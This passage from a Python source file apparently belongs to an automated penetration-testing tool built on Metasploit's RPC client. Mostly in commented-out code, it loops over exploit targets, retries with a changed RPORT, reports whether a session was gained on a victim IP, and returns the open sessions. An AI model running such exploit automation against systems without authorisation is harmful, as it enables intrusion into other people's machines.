                #               '[x] Failed to configure payload for exploit {} : {}'.format(str(exploit),
                #                                                                            str(e)),
                #               self.env.color_monitor.background_ENDC)
                #
                # else:
                #     # TODO
                #     '''
                #     use IA weight data to determine payload
                #     '''
                #     a = None
                # # ----------------------------------------END PAYLOAD CONF------------------------------------ #
                #
                # # --------------------------------TARGETS CONF (EXPLOIT CONF PART 2)-------------------------- #
                # ###RETRIEVE TARGETS LIST RELATED TO THE EXPLOIT AND THE OS OF THE VICTIM###
                # target_list = self.current_targets_option_tree[str(name_exploit_for_use)]
                #
                # for target in target_list:
                #     try:
                #         ###GET THE INDEX###
                #         index = self.targets_option_tree_per_exploit[str(name_exploit_for_use)].index(
                #             str(target))
                #         ###################
                #         self.env.current_exploit.target = index
                #         ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
                #         json_exploit, session = self.env.execute_exploit()
                #         if json_exploit == -1:
                #             print(self.env.color_monitor.background_FAIL +
                #                   '[x] Failed to launch exploit with target {}'.format(str(index)),
                #                   self.env.color_monitor.background_ENDC)
                #         else:
                #             print(self.env.color_monitor.background_HEADER +
                #                   '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
                #                       str(exploit),
                #                       str(self.default_tree_payload_per_exploit[str(name_exploit_for_use)]),
                #                       str(target),
                #                       str(ip),
                #                       str(self.env.current_exploit.runoptions['RPORT'])
                #                   ),
                #                   self.env.color_monitor.background_ENDC)
                #             break
                #         # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
                #
                #         if flag_rport_default_value_changed is None and json_exploit == -1:
                #             ###CHANGE RPORT AND RETRY THE SAME PROCESS WITH TARGET OPTION, EXECPT IF RPORT DEFAULT IS RPORT TREE###
                #             if str(port_number) == str(self.env.current_exploit.runoptions['RPORT']):
                #                 raise Exception("RPORT default and RPORT in the target tree are the same")
                #             #######################################################################################################
                #             #######CHANGE RPORT######
                #             flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
                #             #########################
                #             ###IF RPORT NOT CHANGEABLE###
                #             if flag_check is None:
                #                 raise Exception("RPORT not changeable ")
                #             #############################
                #             ###DISPLAY INFO###
                #             print(
                #                 self.env.color_monitor.background_OKCYAN + "[*] Trying to run exploit by changing RPORT : {}".format(
                #                     str(port_number)))
                #             ##################
                #             for target in target_list:
                #                 ###GET THE INDEX###
                #                 index = self.targets_option_tree_per_exploit[str(name_exploit_for_use)].index(
                #                     str(target))
                #                 ###################
                #                 self.env.current_exploit.target = index
                #                 ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
                #                 json_exploit, session = self.env.execute_exploit()
                #                 if json_exploit == -1:
                #                     print(self.env.color_monitor.background_FAIL +
                #                           '[x] Failed to get session with exploit\'s target {}'.format(
                #                               str(index)),
                #                           self.env.color_monitor.background_ENDC)
                #                 else:
                #                     print(self.env.color_monitor.background_OKGREEN +
                #                           '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
                #                               str(exploit),
                #                               str(self.default_tree_payload_per_exploit[str(exploit)]),
                #                               str(target),
                #                               str(ip),
                #                               str(port_number)
                #                           ),
                #                           self.env.color_monitor.background_ENDC)
                #                     break
                #             # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
                #
                #     except Exception as e:
                #         print(self.env.color_monitor.background_FAIL +
                #               '[x] Failed to launch the exploitation : {}'.format(str(e)),
                #               self.env.color_monitor.background_ENDC)

        toc = time.time()
        # show time of the explotation phase of the target
        print("\n\ntime : ", toc - tic)
        
        print(self.env.color_monitor.background_OKCYAN + "[*] Session :",
              self.env.client.sessions.list,
              self.env.color_monitor.background_ENDC)
        return self.env.client.sessions.list
